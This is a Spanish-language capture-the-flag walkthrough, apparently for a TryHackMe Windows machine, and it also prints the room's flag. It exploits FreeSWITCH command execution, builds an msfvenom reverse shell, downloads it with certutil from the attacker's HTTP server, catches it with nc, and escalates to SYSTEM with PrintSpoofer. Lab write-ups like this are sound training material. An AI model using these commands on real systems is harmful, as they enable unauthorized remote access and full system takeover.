#windowsexploit 

Es una maquina con windows

## Solucion

- Puertos abiertos

```
Discovered open port 3389/tcp on 10.10.28.174
Discovered open port 8021/tcp on 10.10.28.174
```

- Exploit : `https://www.exploit-db.com/exploits/47799`

- Ejecutamos exploit:
```
root@ip-10-10-130-250:~# python xp.py 10.10.28.174 "whoami"
Authenticated
Content-Type: api/response
Content-Length: 25

win-eom4pk0578n\nekrotic

```

- Creamos un exploit con msfvenom para tener una shell
```
msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.130.250 lport=1337 -f exe > shell.exe
```

- Ponemos un server http y lo submimos
```
python3 -m http.server
python xp.py 10.10.28.174 "certutil -urlcache -split -f "http://10.10.130.250:8000/shell.exe""
```

- Lanzamos la shell
```
python xp.py 10.10.28.174 "shell.exe"



nc -lnvp 1337
Listening on [0.0.0.0] (family 0, port 1337)
Connection from 10.10.28.174 49879 received!
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files\FreeSWITCH>

```

- vemos los privilegios con los que contamos, impesonate el good
```
C:\Program Files\FreeSWITCH>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled

SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 

SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled

C:\Program Files\FreeSWITCH>
```

- abusaremos de impersonate con : https://github.com/dievus/printspoofer, lo clonamos y subimos:

```
git clone https://github.com/dievus/printspoofer.git
python3 -m http.server

python ../xp.py 10.10.28.174 "certutil -urlcache -split -f "http://10.10.130.250:8000/PrintSpoofer.exe""
```

- Elevamos privilegios
```
C:\Program Files\FreeSWITCH>PrintSpoofer -i -c cmd
PrintSpoofer -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>

C:\Users\Nekrotic\Desktop>type root.txt
type root.txt
THM{8c8bc5558f0f3f8060d00ca231a9fb5e} 
C:\Users\Nekrotic\Desktop>

```